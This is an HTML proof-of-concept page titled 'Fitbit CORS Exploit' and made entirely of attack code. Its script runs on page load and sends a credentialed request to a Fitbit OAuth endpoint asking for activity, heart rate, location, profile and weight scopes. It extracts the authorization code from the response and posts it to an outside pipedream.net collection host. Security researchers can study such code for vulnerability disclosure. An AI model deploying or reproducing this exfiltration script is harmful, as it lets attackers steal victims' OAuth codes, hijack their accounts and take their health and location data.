<!DOCTYPE html>
<html>
  <head>
    <title>Fitbit CORS Exploit</title>
  </head>
  <body>
    <h1>Testing Fitbit CORS PoC</h1>
    <script>
      const url = "https://strava.fitbit.com/auth/fitbit?response_type=code&client_id=23QPQJ&redirect_uri=https%3A%2F%2Feoqb3e0qi0vy2sc.m.pipedream.net&scope=activity%20heartrate%20location%20profile%20weight&state=fitbitcors";

      fetch(url, {
        method: "GET",
        credentials: "include",
        headers: {
          "Origin": "https://fitbitpoc.netlify.app"
        }
      })
      .then(res => res.text())
      .then(data => {
        // Parse and extract OAuth code
        const code = data.match(/code=([a-zA-Z0-9]+)/);
        if (code) {
          fetch("https://eoqb3e0qi0vy2sc.m.pipedream.net", {
            method: "POST",
            body: JSON.stringify({ code: code[1] }),
            headers: { "Content-Type": "application/json" }
          });
        } else {
          console.log("No code found");
        }
      });
    </script>
  </body>
</html>
